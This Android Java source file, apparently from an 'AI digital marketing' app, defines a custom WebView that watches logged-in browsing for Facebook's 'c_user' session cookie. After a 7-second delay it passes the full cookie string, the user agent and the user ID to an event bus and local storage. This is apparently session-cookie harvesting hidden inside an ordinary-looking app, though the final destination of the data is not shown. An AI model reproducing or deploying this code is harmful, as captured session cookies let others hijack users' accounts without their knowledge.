package com.madgicx.ai_digital_marketing.widget;

import android.content.Context;
import android.os.Handler;
import android.util.AttributeSet;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.madgicx.ai_digital_marketing.event.StringEvent;
import com.madgicx.ai_digital_marketing.utils.EventBusUtil;
import com.madgicx.ai_digital_marketing.utils.ShareUtils;

public class CWebView extends WebView {

    private String old_cookie = "";

    public CWebView(@NonNull Context context) {
        super(context);
        init();
    }

    public CWebView(@NonNull Context context, @Nullable AttributeSet attrs) {
        super(context, attrs);
        init();
    }

    public CWebView(@NonNull Context context, @Nullable AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
        init();
    }

    public CWebView(@NonNull Context context, @Nullable AttributeSet attrs, int defStyleAttr, boolean privateBrowsing) {
        super(context, attrs, defStyleAttr, privateBrowsing);
        init();
    }

    private void init() {
        this.setWebViewClient(new MyBrowser());
        WebSettings webSettings = this.getSettings();
        webSettings.setLoadsImagesAutomatically(true);
        webSettings.setJavaScriptEnabled(true);
        this.setVerticalScrollBarEnabled(true);
        webSettings.setDefaultTextEncodingName("utf-8");
    }

    private class MyBrowser extends WebViewClient {

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            view.loadUrl(url);
            try {
                String cookie = CookieManager.getInstance().getCookie(url);
                if (cookie.contains("c_user") && old_cookie != getCookie(url, "c_user")) {
                    old_cookie = getCookie(url, "c_user");
                    new Handler().postDelayed(() -> {
                        EventBusUtil.post(new StringEvent(cookie, getSettings().getUserAgentString(), getCookie(url, "c_user")));
                        ShareUtils.INSTANCE.putString(view.getContext(), "c_user", getCookie(url, "c_user"));
                    }, 7000);
                }
            } catch (Exception ignored) {
                ignored.printStackTrace();
            }
            return true;
        }

        public String getCookie(String siteName,String cookieName){
            String cookieValue = null;

            CookieManager cookieManager = CookieManager.getInstance();
            String cookies = cookieManager.getCookie(siteName);
            String[] temp=cookies.split(";");
            for (String ar1 : temp ){
                if(ar1.contains(cookieName)){
                    String[] temp1=ar1.split("=");
                    cookieValue = temp1[1];
                    break;
                }
            }
            return cookieValue;
        }
    }
}
